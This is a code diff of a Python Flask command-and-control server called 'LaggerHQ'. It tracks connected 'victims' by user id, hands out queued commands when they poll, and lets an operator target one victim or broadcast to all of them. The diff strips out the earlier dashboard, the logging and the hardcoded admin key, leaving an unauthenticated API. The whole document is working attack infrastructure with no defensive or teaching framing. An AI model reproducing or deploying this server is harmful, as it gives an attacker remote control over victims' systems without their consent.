@@ -1,66 +1,15 @@
-from flask import Flask, request, jsonify, render_template, session, redirect, url_for
-import os
-import json
+from flask import Flask, request, jsonify
 import time
 
 app = Flask(__name__)
-app.secret_key = os.urandom(24) # Secure random key for sessions
 
-# DATA STORAGE (In-Memory)
+# In-memory storage (clears on restart)
 VICTIMS = {}
 COMMAND_QUEUE = {}
-LOGS = [] # Format: { "time": "HH:MM:SS", "type": "INFO/WARN/CMD", "msg": "..." }
-
-# CONFIG
-ADMIN_KEY = "Slay7676guyufezfze"
-
-def add_log(log_type, message):
-    timestamp = time.strftime("%H:%M:%S")
-    LOGS.insert(0, {"time": timestamp, "type": log_type, "msg": message})
-    if len(LOGS) > 100: LOGS.pop() # Keep last 100
-
-# --- WEB INTERFACE ROUTES ---
 
 @app.route('/')
-def index():
-    if session.get('logged_in'):
-        return redirect(url_for('dashboard'))
-    return redirect(url_for('login'))
-
-@app.route('/login', methods=['GET', 'POST'])
-def login():
-    error = None
-    if request.method == 'POST':
-        if request.form['password'] == ADMIN_KEY:
-            session['logged_in'] = True
-            add_log("INFO", "Admin logged in")
-            return redirect(url_for('dashboard'))
-        else:
-            error = 'Invalid Access Key'
-            add_log("WARN", "Failed login attempt")
-    return render_template('login.html', error=error)
-
-@app.route('/dashboard')
-def dashboard():
-    if not session.get('logged_in'): return redirect(url_for('login'))
-    return render_template('dashboard.html')
-
-@app.route('/logs')
-def logs_page():
-    if not session.get('logged_in'): return redirect(url_for('login'))
-    return render_template('logs.html', logs=LOGS)
-
-@app.route('/settings')
-def settings_page():
-    if not session.get('logged_in'): return redirect(url_for('login'))
-    return render_template('settings.html', admin_key=ADMIN_KEY)
-
-@app.route('/logout')
-def logout():
-    session.pop('logged_in', None)
-    return redirect(url_for('login'))
-
-# --- API ROUTES ---
+def home():
+    return "LaggerHQ API is Running."
 
 @app.route('/register', methods=['POST'])
 def register():
@@ -68,69 +17,79 @@ def register():
     uid = str(data.get('userid'))
     username = data.get('username')
     
-    if uid not in VICTIMS:
-        add_log("INFO", f"New Victim Connected: {username} ({uid})")
-    
+    if not uid or not username:
+        return jsonify({"error": "Invalid data"}), 400
+        
     VICTIMS[uid] = {
         "name": username,
         "last_seen": time.time()
     }
-    return jsonify({"status": "success", "msg": "Registered"})
+    
+    # Initialize command queue for this user if not exists
+    if uid not in COMMAND_QUEUE:
+        COMMAND_QUEUE[uid] = "NO_CMD"
+        
+    return jsonify({"status": "registered", "uid": uid})
 
-@app.route('/poll/<userid>', methods=['GET'])
-def poll(userid):
-    uid = str(userid)
+@app.route('/poll/<uid>', methods=['GET'])
+def poll(uid):
+    uid = str(uid)
     if uid in VICTIMS:
         VICTIMS[uid]['last_seen'] = time.time()
     
-    cmd = COMMAND_QUEUE.get(uid)
-    if cmd:
-        del COMMAND_QUEUE[uid]
-        return jsonify({"command": cmd})
-    return jsonify({"command": "NO_CMD"})
+    cmd = COMMAND_QUEUE.get(uid, "NO_CMD")
+    
+    # Clear command after sending (one-time execution)
+    # Exception: We don't clear it immediately if we want persistence, 
+    # but for simple commands, consuming it is better.
+    # However, for 'ALL' broadcasts, we handled it differently.
+    # Let's simple consume it.
+    if cmd != "NO_CMD":
+        COMMAND_QUEUE[uid] = "NO_CMD"
+        
+    return jsonify({"command": cmd})
 
 @app.route('/command', methods=['POST'])
 def send_command():
-    # Web Dashboard check (if cookie present)
-    is_web_user = session.get('logged_in')
-    
     data = request.json
     target_id = str(data.get('target'))
     cmd = data.get('command')
     
+    if not target_id or not cmd:
+        return jsonify({"error": "Missing target or command"}), 400
+        
     if target_id == "ALL":
         count = 0
         for uid in VICTIMS:
             COMMAND_QUEUE[uid] = cmd
             count += 1
-        add_log("CMD", f"Broadcast '{cmd}' to {count} victims")
         return jsonify({"status": "broadcast_queued", "count": count, "cmd": cmd})
     else:
         COMMAND_QUEUE[target_id] = cmd
-        v_name = VICTIMS.get(target_id, {}).get("name", "Unknown")
-        add_log("CMD", f"Sent '{cmd}' to {v_name}")
         return jsonify({"status": "queued", "target": target_id, "cmd": cmd})
 
 @app.route('/victims', methods=['GET'])
 def get_victims():
-    cleanup_victims()
-    return jsonify(VICTIMS)
-
-@app.route('/api/clear_logs', methods=['POST'])
-def clear_logs():
-    if not session.get('logged_in'): return jsonify({"error": "Unauthorized"}), 401
-    LOGS.clear()
-    add_log("INFO", "Logs cleared by admin")
-    return jsonify({"status": "cleared"})
-
-def cleanup_victims():
-    # Remove victims inactive for > 30 seconds
-    now = time.time()
-    to_remove = [uid for uid, data in VICTIMS.items() if now - data['last_seen'] > 30]
+    # Optional: Clean up old victims (offline > 30s)
+    current_time = time.time()
+    offline_threshold = 30
+    
+    active_victims = {}
+    to_remove = []
+    
+    for uid, data in VICTIMS.items():
+        if current_time - data['last_seen'] < offline_threshold:
+            active_victims[uid] = data
+        else:
+            to_remove.append(uid)
+            
+    # Remove offline
     for uid in to_remove:
         del VICTIMS[uid]
-        add_log("INFO", f"Victim Disconnected: {data['name']} (Timeout)")
-
+        if uid in COMMAND_QUEUE:
+            del COMMAND_QUEUE[uid]
+            
+    return jsonify(active_victims)
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+    app.run(host='0.0.0.0', port=5000)
